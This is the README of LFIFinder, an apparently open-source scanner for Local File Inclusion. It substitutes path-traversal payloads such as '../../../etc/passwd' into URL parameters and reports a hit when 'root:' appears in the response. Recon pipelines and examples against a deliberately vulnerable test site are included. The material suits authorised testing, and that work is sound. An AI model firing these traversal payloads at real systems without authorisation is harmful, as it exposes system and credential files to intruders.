# LFIFinder

A Light Weight Tool for checking Local File Inclusion (LFI) vulnerabilities by replacing lfi payloads in the parameters values and checking 'root:' in the response.

## Installation
```
git clone https://github.com/rix4uni/LFIFinder.git
cd LFIFinder
pip3 install -r requirements.txt
```

## Example usages

Note: must use `uro`

Single URL:
```
echo "http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg" | python3 lfifinder.py
```

Multiple URLs:
```
cat lfi-urls.txt | python3 lfifinder.py
```

## Chaining With Other Tools
```
echo "http://testphp.vulnweb.com" | waybackurls | gf lfi | uro | anew | python3 lfifinder.py --threads 50
echo "http://testphp.vulnweb.com" | waybackurls | gf lfi | uro | anew lfi-urls.txt # use this output in Multiple URLs
```
## To get best results
```
open lfi_payloads.txt add your favraioute payloads
```

## How It Works
```
For Example Url is:- 
http://testphp.vulnweb.com/showimage.php?file=first&cat=second

It will check all lfipayloads one by one:-
NOT VULNERABLE: http://testphp.vulnweb.com/showimage.php?file=../../etc/passwd&cat=../../etc/passwd
VULNERABLE: http://testphp.vulnweb.com/showimage.php?file=../../../etc/passwd&cat=../../../etc/passwd
NOT VULNERABLE: http://testphp.vulnweb.com/showimage.php?file=../../../../../../../etc/passwd&cat=../../../../../../../etc/passwd
```
